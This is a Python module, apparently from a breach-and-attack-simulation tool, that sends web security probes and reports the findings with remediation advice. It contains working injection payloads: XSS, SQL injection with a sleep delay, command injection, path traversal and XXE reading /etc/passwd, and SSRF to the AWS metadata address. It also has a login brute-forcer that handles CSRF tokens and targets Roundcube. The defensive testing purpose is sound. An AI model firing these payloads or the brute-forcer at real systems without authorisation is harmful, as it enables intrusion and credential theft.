"""
Vuln Scanner Module
Manual request templates for common web security test scenarios.
8 tabs: XSS, SQLi, Command Injection, Path Traversal, XXE, SSRF,
Brute Force, Port Scan.
"""

import asyncio
import aiohttp
import json
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.vuln_scanner")

# Default payload templates for each test type
DEFAULT_TEMPLATES = {
    "xss": {
        "description": "Test for reflected script injection",
        "method": "GET",
        "payload": "<script>alert(1)</script>",
        "param": "q",
        "headers": "{}"
    },
    "sqli": {
        "description": "Test for SQL injection with delay",
        "method": "GET",
        "payload": "' OR SLEEP(5) --",
        "param": "id",
        "headers": "{}"
    },
    "cmd_injection": {
        "description": "Test for OS command injection",
        "method": "GET",
        "payload": "; ping 127.0.0.1 -c 1",
        "param": "file",
        "headers": "{}"
    },
    "path_traversal": {
        "description": "Test for path traversal (read /etc/passwd)",
        "method": "GET",
        "payload": "../../../etc/passwd",
        "param": "file",
        "headers": "{}"
    },
    "xxe": {
        "description": "Test for XML external entity injection",
        "method": "POST",
        "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        "param": "",
        "headers": '{"Content-Type": "application/xml"}'
    },
    "ssrf": {
        "description": "Test for server-side request forgery (AWS metadata)",
        "method": "GET",
        "payload": "http://169.254.169.254/latest/meta-data/",
        "param": "url",
        "headers": "{}"
    },
    "bruteforce": {
        "description": "Try common username/password combinations",
        "method": "POST",
        "payload": "",  # not used; we'll use a wordlist
        "param": "",
        "headers": '{"Content-Type": "application/x-www-form-urlencoded"}',
        "wordlist": [
            ("admin", "admin"),
            ("admin", "password"),
            ("user", "password"),
            ("root", "root"),
            ("admin", "123456")
        ]
    },
    "portscan": {
        "description": "Check if a specific port is open",
        "method": "TCP",
        "payload": "",   # not used
        "param": "",
        "headers": "{}",
        "port": 80
    }
}

class VulnScannerModule(BaseAttackModule):
    MODULE_NAME = "vuln_scanner"
    DESCRIPTION = "Send manual security test requests (XSS, SQLi, etc.)"
    MITRE_TACTIC = "Initial Access"
    MITRE_IDS = ["T1190"]

    async def execute(self) -> List[Finding]:
        findings = []
        options = self.options

        test_type = options.get("test_type", "xss")
        template = DEFAULT_TEMPLATES.get(test_type, DEFAULT_TEMPLATES["xss"])
        target = options.get("url", self.target)
        method = options.get("method", template.get("method", "GET"))
        headers = options.get("headers", {})
        body = options.get("body", "")
        timeout_sec = options.get("timeout", 10)
        inject_param = options.get("inject_param", template.get("param", ""))

        # For brute force, we need a list of credentials
        if test_type == "bruteforce":
            findings.extend(await self._run_bruteforce(target, options, timeout_sec))
        elif test_type == "portscan":
            findings.extend(await self._run_portscan(target, options, timeout_sec))
        else:
            # Build the actual request
            # If we have an injection parameter, insert payload into query or body
            payload = options.get("payload", template.get("payload", ""))
            if inject_param and method.upper() == "GET":
                # Inject into URL query
                parsed = urlparse(target)
                query = parse_qs(parsed.query)
                query[inject_param] = payload
                new_query = urlencode(query, doseq=True)
                target = urlunparse(parsed._replace(query=new_query))
            elif inject_param and method.upper() in ("POST", "PUT", "PATCH"):
                # Inject into body (assume JSON or form)
                # If body is JSON, parse and update
                try:
                    body_json = json.loads(body)
                    body_json[inject_param] = payload
                    body = json.dumps(body_json)
                    headers["Content-Type"] = "application/json"
                except:
                    # If not JSON, treat as form data
                    body = f"{inject_param}={payload}"
                    if "Content-Type" not in headers:
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
            else:
                if payload and method.upper() == "GET":
                    if payload.startswith("http://") or payload.startswith("https://"):
                        if "?" in target:
                            target = target + payload
                        else:
                            target = target.rstrip("/") + "/" + payload
                    else:
                        if "?" not in target and not target.endswith(payload):
                            target = target.rstrip("/") + "/" + payload
                elif payload and method.upper() in ("POST", "PUT", "PATCH"):
                    # If it's a POST/PUT/PATCH request and no inject param is given, the payload itself becomes the body.
                    # This is essential for things like XXE which pass raw XML payloads.
                    body = payload

            # Send the request
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                try:
                    start = asyncio.get_event_loop().time()
                    async with session.request(
                        method=method.upper(),
                        url=target,
                        headers=headers,
                        data=body if method.upper() in ("POST", "PUT", "PATCH") else None,
                        timeout=aiohttp.ClientTimeout(total=timeout_sec),
                        ssl=False,
                        allow_redirects=False
                    ) as resp:
                        elapsed = asyncio.get_event_loop().time() - start
                        response_body = await resp.text()
                        body_preview = response_body[:1000]
                        if len(response_body) > 1000:
                            body_preview += "... (truncated)"

                        # Analyze response for vulnerabilities based on test type
                        is_vulnerable = False
                        body_lower = response_body.lower()
                        
                        if test_type == "xss":
                            # Check if payload is reflected without encoding
                            is_vulnerable = payload in response_body
                        elif test_type == "sqli":
                            # Check for common SQL errors or time delay
                            sql_errors = ["syntax error", "mysql_fetch", "sqlite3", "ora-", "postgresql"]
                            is_vulnerable = any(err in body_lower for err in sql_errors) or elapsed >= 4.0
                        elif test_type == "cmd_injection":
                            # Command output or delay
                            cmd_markers = ["uid=", "root:x", "ttl=", "ms"] # e.g. ping or id output
                            is_vulnerable = any(m in body_lower for m in cmd_markers) or elapsed >= 2.0
                        elif test_type == "path_traversal" or test_type == "xxe":
                            # Reading /etc/passwd
                            is_vulnerable = "root:x:0:0" in response_body
                        elif test_type == "ssrf":
                            # Assuming AWS metadata test
                            is_vulnerable = "ami-id" in body_lower or "instance-id" in body_lower or '"Token"' in response_body
                        else:
                            # Fallback generic reflection check
                            is_vulnerable = payload and payload in response_body

                        evidence = {
                            "test_type": test_type,
                            "request": {
                                "method": method,
                                "url": target,
                                "headers": headers,
                                "body_preview": body[:500] if body else None,
                            },
                            "response": {
                                "status": resp.status,
                                "reason": resp.reason,
                                "headers": dict(resp.headers),
                                "body_preview": body_preview,
                                "elapsed_s": round(elapsed, 2),
                                "vulnerable_indicator": is_vulnerable,
                            }
                        }

                        severity = Severity.CRITICAL if is_vulnerable else Severity.INFO

                        findings.append(self.finding(
                            title=f"{test_type.upper()} Test – {'Potential' if is_vulnerable else 'No'} Indicator",
                            description=f"Sent {test_type} probe to {target}. Status: {resp.status}",
                            severity=severity,
                            mitre_id="T1190",
                            evidence=json.dumps(evidence, indent=2),
                            remediation="Review input handling and output encoding.",
                            mode="safe",
                            evidence_type="vuln_scan"
                        ))

                except asyncio.TimeoutError:
                    findings.append(self.finding(
                        title="Request Timeout",
                        description=f"Probe timed out after {timeout_sec}s.",
                        severity=Severity.MEDIUM,
                        mitre_id="T1190",
                        evidence=f"Timeout: {timeout_sec}s",
                        remediation="Adjust timeout or check target availability.",
                        mode="safe",
                        evidence_type="vuln_scan"
                    ))
                except Exception as e:
                    logger.exception("Error in vuln_scanner")
                    findings.append(self.finding(
                        title="Error",
                        description=f"Error: {str(e)}",
                        severity=Severity.MEDIUM,
                        mitre_id="T1190",
                        evidence=str(e),
                        remediation="Check input parameters.",
                        mode="safe",
                        evidence_type="vuln_scan"
                    ))

        return findings

    # ─── Brute Force ──────────────────────────────────────────────────────────

    async def _run_bruteforce(self, target: str, options: dict, timeout: int) -> List[Finding]:
        findings = []
        login_url = options.get("login_url", target)
        username_param = options.get("username_param", "username")
        password_param = options.get("password_param", "password")
        wordlist = options.get("wordlist", DEFAULT_TEMPLATES["bruteforce"]["wordlist"])
        
        # Parse string wordlist from UI input into list of tuples
        if isinstance(wordlist, str):
            parsed_wordlist = []
            for pair in wordlist.split(','):
                parts = pair.strip().split(':', 1)
                if len(parts) == 2:
                    parsed_wordlist.append((parts[0], parts[1]))
            wordlist = parsed_wordlist

        last_error = None
        attempt_count = 0

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            for username, password in wordlist:
                attempt_count += 1

                # Step 1: Hit login page to get session cookie and CSRF token *for this attempt*
                # Roundcube invalidates tokens on failed logins, so we MUST fetch a fresh one each time.
                default_token = None
                default_token_name = "_token"
                canonical_url = login_url
                try:
                    async with session.get(login_url, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False, allow_redirects=True) as get_resp:
                        body_get = await get_resp.text()
                        canonical_url = str(get_resp.url)
                        import re
                        token_names_pattern = r'(?:request_token|_token|token|_csrf)'
                        m = re.search(r'name=["\'](' + token_names_pattern + r')["\'][^>]*value=["\']([^"\']{8,})["\']', body_get)
                        if m:
                            default_token_name, default_token = m.group(1), m.group(2)
                        else:
                            m = re.search(r'value=["\']([^"\']{8,})["\'][^>]*name=["\'](' + token_names_pattern + r')["\']', body_get)
                            if m:
                                default_token = m.group(1)
                                default_token_name = m.group(2)
                except Exception as e:
                    logger.warning(f"Error fetching token: {e}")
                    pass
                
                # Prepare POST data
                data = {
                    username_param: username, 
                    password_param: password,
                    "_user": username,  # Fallback for Roundcube webmail
                    "_pass": password,  # Fallback for Roundcube webmail
                    "_action": "login"  # Fallback for Roundcube webmail
                }
                
                # Insert token if found
                if default_token:
                    data[default_token_name] = default_token

                logger.info(f"BRUTEFORCE ATTEMPT {attempt_count}: user={username}, token={default_token}")

                try:
                    # Give it plenty of time; successful webmail logins can take longer to redirect
                    async with session.post(canonical_url, data=data, timeout=aiohttp.ClientTimeout(total=timeout + 15), ssl=False, allow_redirects=True) as resp:
                        body = await resp.text()
                        
                        success = False
                        location = str(resp.url)
                        logger.info(f"BRUTEFORCE RESPONSE: status={resp.status}, location={location}")
                        
                        if "_task=mail" in location:
                            success = True
                        elif resp.status == 200:
                            body_lower = body.lower()
                            pass_markers = ["logout", "dashboard", "_task=mail", "rcmbody"]
                            fail_markers = ["invalid_login", "login failed", "incorrect password", "login-form", "rcmloginuser"]
                            has_pass = any(m in body_lower for m in pass_markers)
                            has_fail = any(m in body_lower for m in fail_markers)
                            success = has_pass and not has_fail
                            
                        # If Basic auth is challenged, the post logic needs to handle that. Assuming Form auth here.

                        if success:
                            logger.info(f"BRUTEFORCE SUCCESS: {username}:{password}")
                            evidence = {
                                "username": username,
                                "password": password,
                                "status": resp.status,
                                "body_preview": body[:500]
                            }
                            findings.append(self.finding(
                                title="Potential Credential Found",
                                description=f"Login successful with {username}:{password}",
                                severity=Severity.CRITICAL,
                                mitre_id="T1110",
                                evidence=json.dumps(evidence, indent=2),
                                remediation="Enforce strong password policy and account lockout.",
                                mode="safe",
                                evidence_type="bruteforce"
                            ))
                            break  # stop after first success
                except Exception as e:
                    logger.error(f"BRUTEFORCE ERROR during post: {repr(e)}")
                    last_error = str(e)
                    continue

            if not findings:
                if last_error and attempt_count == len(wordlist):
                    findings.append(self.finding(
                        title="Brute Force Failed (Network Error)",
                        description=f"All requests failed. Last error: {last_error}",
                        severity=Severity.MEDIUM,
                        mitre_id="T1110",
                        evidence=f"Error: {last_error}",
                        remediation="Check target URL, network connectivity, and SSL configuration.",
                        mode="safe",
                        evidence_type="bruteforce"
                    ))
                else:
                    findings.append(self.finding(
                        title="Brute Force Completed",
                        description="No valid credentials found in the provided wordlist.",
                        severity=Severity.INFO,
                        mitre_id="T1110",
                        evidence="All attempts failed or timed out.",
                        remediation="Ensure login endpoint is correct.",
                        mode="safe",
                        evidence_type="bruteforce"
                    ))

        return findings

    # ─── Port Scan ────────────────────────────────────────────────────────────

    async def _run_portscan(self, target: str, options: dict, timeout: int) -> List[Finding]:
        findings = []
        port = options.get("port", 80)
        # Extract host from target URL (remove scheme and path)
        parsed = urlparse(target)
        host = parsed.hostname or target.split(":")[0]

        try:
            # Try a TCP connection
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            open_status = True
            message = f"Port {port} is open on {host}"
            severity = Severity.HIGH
        except (asyncio.TimeoutError, ConnectionRefusedError):
            open_status = False
            message = f"Port {port} is closed or filtered on {host}"
            severity = Severity.INFO
        except Exception as e:
            open_status = False
            message = f"Error scanning port: {str(e)}"
            severity = Severity.MEDIUM

        findings.append(self.finding(
            title=f"Port {port} – {'Open' if open_status else 'Closed'}",
            description=message,
            severity=severity,
            mitre_id="T1046",
            evidence=f"Host: {host}\nPort: {port}",
            remediation="Restrict unnecessary open ports.",
            mode="safe",
            evidence_type="portscan"
        ))

        return findings